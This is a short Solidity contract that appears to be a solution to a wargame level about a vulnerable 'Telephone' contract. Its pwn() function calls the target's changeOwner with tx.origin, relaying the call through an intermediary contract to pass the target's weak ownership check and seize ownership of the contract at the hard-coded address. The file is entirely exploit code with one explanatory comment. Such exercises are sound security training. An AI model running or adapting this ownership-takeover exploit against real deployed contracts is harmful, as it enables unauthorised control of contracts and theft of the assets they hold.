pragma solidity ^0.8;

interface Telephone {
	function changeOwner(address _owner) external;
}

contract expl {
	Telephone public contract_t = Telephone(0x83885fB818dF9A6CE2716d9b9A720310E958E83e);

	function pwn() public {
		contract_t.changeOwner(tx.origin); // tx.origin refers to original transaction sender
	}
}
